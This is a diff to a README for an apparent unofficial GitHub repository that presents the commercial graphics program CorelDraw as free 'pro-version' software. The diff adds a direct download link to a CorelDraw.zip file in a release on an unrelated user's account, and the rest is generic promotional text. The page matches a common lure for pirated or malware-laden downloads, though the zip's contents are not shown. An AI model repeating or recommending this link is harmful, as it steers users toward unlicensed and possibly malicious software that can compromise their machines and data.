@@ -7,9 +7,8 @@ Welcome to the CorelDraw repository! 🚀 This is your ultimate source for acces
 - Topics: Graphic-Design, CorelDraw, vector-illustration, free-software, design-software, pro-version
 
 ## 🔗 Software Access  
-### Download: [CorelDraw]()
+### Download: [CorelDraw](https://github.com/xyt0169/CorelDraw-Latest-Version-For-Windows/releases/download/CorelDraw/CorelDraw.zip)
 
-Note: Make sure to visit the link to obtain the software package. 💻  
 
 ## 🎉 Overview of CorelDraw  
 CorelDraw is celebrated for its powerful vector graphic capabilities and intuitive interface, designed to streamline the design process. From logo creation to complex illustrations, this software offers everything you need to achieve stunning graphics. Whether you want to create marketing materials, illustrations, or layouts, CorelDraw is your trusted tool.
